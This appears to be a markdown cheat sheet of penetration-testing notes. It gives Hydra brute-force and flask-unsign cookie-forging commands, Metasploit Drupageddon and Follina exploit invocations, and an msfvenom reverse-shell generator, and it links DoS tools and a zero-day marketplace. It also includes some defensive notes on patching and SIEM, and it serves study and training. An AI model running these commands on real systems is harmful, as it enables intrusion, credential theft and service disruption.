# Cybersecurity Threats & Offensive Security Techniques

## Frameworks for Tracking Threat Actions
- **MITRE ATT&CK**: [https://attack.mitre.org/](https://attack.mitre.org/)

## Exploitation Techniques
### Brute-Forcing with Hydra
```sh
hydra -L users.txt -P pass.txt IP_ADDRESS ftp -V
```

### Intrusion Prevention Systems (IPS)
- IPS solutions analyze network traffic to detect and prevent threats.
- Example: **Snort** ([https://www.snort.org/](https://www.snort.org/))

## Port Scanning & Enumeration
### Checking Open Ports:
- **Windows:**
```sh
netstat -an
netstat -antb
```
- **Unix/Linux:**
```sh
ss -nltp
netstat -tulpn
```

## JWT Token Security Assessment
```sh
flask-unsign -u -c .XXXXXXXXX -nE -w /usr/share/wordlists/rockyou.txt
flask-unsign -s --secret "secret123" --cookie "{'login': True, 'username': 'blue'}" -l
sudo -l
```

## DataBase Vulnerability Research
- **Exploit Database**: [https://www.exploit-db.com/](https://www.exploit-db.com/)
- **Common Vulnerabilities (CVE Database)**: [https://www.cve.org/](https://www.cve.org/)   && https://www.cvedetails.com 
- **National Vulnerability Database**: [https://nvd.nist.gov/](https://nvd.nist.gov/)

## CMS Vulnerabilities
### Drupal 7 (Versions 7.0 - 7.31) - SQL Injection Exploit
```sh
msf6 exploit(multi/http/drupal_drupageddon) > show options
msf6 exploit(multi/http/drupal_drupageddon) > exploit
```

## Preventing Obsolete Software Vulnerabilities
- Regularly update all system components, including plugins and dependencies.
- Ensure security patches are applied to the entire system.
- Review configurations to prevent misconfigurations leading to vulnerabilities.

## Password Cracking (brute-force) & Hash Recovery
- **Hydra**: [https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
- **Hashcat**: [https://hashcat.net/wiki/](https://hashcat.net/wiki/)
  - ***Example:*** https://hashcat.net/wiki/doku.php?id=example_hashes  
- **CrackStation**: [https://crackstation.net](https://crackstation.net)

## Credential Capture with Responder
- Tool: [https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)

## Zero-Day Exploit Marketplace
- [https://0day.today](https://0day.today)

## Exploiting Microsoft Office Vulnerabilities
### CVE-2022-30190 (Follina)
```sh
python3 follina.py -r 9999
```
- More details: [https://www.hackthebox.com/blog/cve-2022-30190-follina-explained](https://www.hackthebox.com/blog/cve-2022-30190-follina-explained)

## Wireless Security Assessment Tools
- **Airgeddon**: [https://github.com/v1s1t0r1sh3r3/airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)
- **WiFiPhisher**: [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)
- **WiFi Exploitation Framework**: [https://github.com/D3Ext/WEF](https://github.com/D3Ext/WEF)


```sh 
python listener.py
```

**More details at:**: https://www.youtube.com/watch?v=A8DkVDQW1-w

*Technical Side of Phishing Attacks is Scary Easy to Replicate* <br />


## Social Engineering & Phishing
- **SET (Social Engineer Toolkit)**: [https://github.com/trustedsec/social-engineer-toolkit](https://github.com/trustedsec/social-engineer-toolkit)
```sh
sudo setoolkit
```

## Denial of Service (DoS) Attack Tools
- **LOIC** ([https://sourceforge.net/projects/loic/](https://sourceforge.net/projects/loic/))
- **HOIC** ([https://sourceforge.net/projects/highorbitioncannon/](https://sourceforge.net/projects/highorbitioncannon/))
- **hping3** ([https://www.kali.org/tools/hping3/](https://www.kali.org/tools/hping3/))
- **TorsHammer** ([https://github.com/Karlheinzniebuhr/torshammer](https://github.com/Karlheinzniebuhr/torshammer))

## Reverse Shell & Payload Generation
### Generating a Windows Reverse Shell with MSFVenom
```sh
msfvenom -p windows/x64/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe -o file.exe
```

## Ransomware Overview
- **Notable Variants**:
  1) WannaCry
  2) CryptoLocker
  3) BadRabbit

## Spyware & Information Theft
- Spyware remains hidden while collecting sensitive user data.

## SQL Injection Techniques
- Error-based, Union-based, Blind SQL Injection
```sh
msf6 exploit(multi/http/drupal_drupageddon) > show options
msf6 exploit(multi/http/drupal_drupageddon) > exploit
```

# Brute Forcing Attacks   <br />
**Example software for performing the attack:**   <br />
▪ **THC-Hydra:** https://github.com/vanhauser-thc/thchydra   <br />
▪ **Burp Intruder:** https://portswigger.net/burp/pro   <br />
▪ **Medusa:** https://github.com/jmk-foofus/medusa   <br />


## Security Information and Event Management (SIEM)
### Enumerating Active Reverse Shells
```sh
ps -aef --forest
```
- **Common SIEM Tools**: Splunk, ELK Stack, QRadar
- **Common Red Team Tools**: Sliver C2, Wireshark

## Penetration Testing Operating Systems
- **Kali Linux**: [https://www.kali.org](https://www.kali.org)
- **Parrot OS**: [https://www.parrotsec.org](https://www.parrotsec.org)
- **Black Arch**: [https://blackarch.org](https://blackarch.org)
- **CommandoVM:** [https://github.com/mandiant/commando-vm](https://github.com/mandiant/commando-vm)
- **Nessus:** [https://www.tenable.com/products/nessus](https://www.tenable.com/products/nessus)
- **Nmap:** [https://nmap.org](https://nmap.org)
- **BurpSuite:** [https://portswigger.net/burp](https://portswigger.net/burp)
- **Searchsploit:** [https://www.exploit-db.com/searchsploit](https://www.exploit-db.com/searchsploit)


## Privilege Escalation
### Local Enumeration for Escalation Paths
- **LinPEAS**: [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

**More details at:** https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

**On github:** https://github.com/juliocesarfort/public-pentesting-reports

## Hands-on Cybersecurity Training
- **TryHackMe**: [https://tryhackme.com/](https://tryhackme.com/)
- **HackTheBox**: [https://www.hackthebox.com/](https://www.hackthebox.com/)
- **Vulnhub**: [https://www.vulnhub.com/](https://www.vulnhub.com/)

**Use ATT&CK Navigator:** <br />
https://mitre-attack.github.io/attack-navigator/ to map a sample TTP   

## Wordlist Setup for Attacks
```sh
cd /opt/
sudo git clone https://github.com/danielmiessler/SecLists
cd /usr/share/wordlists
sudo gzip -d rockyou.txt.gz
```
